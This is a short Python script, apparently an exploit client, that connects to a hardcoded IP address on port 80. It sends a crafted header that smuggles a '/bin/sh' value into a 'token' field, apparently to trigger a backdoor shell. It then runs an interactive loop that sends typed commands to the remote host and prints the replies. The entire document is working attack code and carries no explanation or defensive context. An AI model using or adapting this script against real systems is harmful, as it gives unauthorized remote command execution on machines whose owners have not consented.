import socket
skt = socket.socket()
skt.connect(("106.75.93.221", 80))
#payload = """User-Agent: useragent|token: /bin/sh"""
payload1 = "User-Agent: urgqebci|token: /bin/sh\r\n\r\n"
payload2 = str.encode(payload1)
skt.send(payload2)
recv = skt.recv(1024)
print (recv)
while 1:
    cmd = input(" > ")
    payload3 = str.encode(cmd)
    skt.send(payload3)
    buffer = skt.recv(1024)
    print (buffer)
